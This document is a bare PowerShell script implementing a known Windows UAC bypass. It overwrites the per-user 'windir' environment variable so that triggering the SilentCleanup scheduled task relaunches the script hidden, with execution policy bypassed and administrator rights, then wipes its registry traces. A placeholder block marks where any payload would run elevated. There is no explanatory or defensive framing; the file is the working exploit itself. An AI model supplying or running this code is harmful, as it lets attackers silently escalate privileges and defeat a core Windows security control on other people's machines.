if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) 
{
  #user script that will run with admin priviledges
  Write-Output "this requires admin priviledges" > C:\Windows\adminonly.txt
  #end of user script
    
  Remove-ItemProperty -Path "HKCU:\Environment" -Name "bypassed" -ErrorAction SilentlyContinue
} 
elseif(-not (Get-ItemProperty -Path "HKCU:\Environment" -Name "bypassed"))
{
  Set-ItemProperty -Path "HKCU:\Environment" -Name "bypassed" -Value "yes"
  Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "powershell -ep bypass -w h $PSCommandPath;#"
  schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
  Remove-ItemProperty -Path "HKCU:\Environment" -Name "windir" -ErrorAction SilentlyContinue
}
else
{
  Remove-ItemProperty -Path "HKCU:\Environment" -Name "bypassed" -ErrorAction SilentlyContinue
}